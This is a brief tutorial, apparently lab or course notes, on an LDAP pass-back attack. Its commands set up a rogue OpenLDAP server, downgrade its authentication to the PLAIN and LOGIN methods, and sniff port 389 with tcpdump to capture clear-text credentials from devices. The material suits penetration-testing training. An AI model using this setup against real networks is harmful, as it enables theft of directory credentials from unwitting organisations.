## Performing an LDAP Pass-back

>> Use the following command to install OpenLDAP which will be used later to create
a rouge LDAP server.

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`

>> Then configure your own rogue LDAP server
`sudo dpkg-reconfigure -p low slapd`

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. Use the ldif file to patch your LDAP server.

`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`

Then verify that our rogue LDAP server's configuration has been applied using the following command:

`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`

Once Configured correctly, run tcpdump on the interface connected to the network, tun0 in my case, by the following command:
`sudo tcpdump -SX -i **interface** tcp port 389`

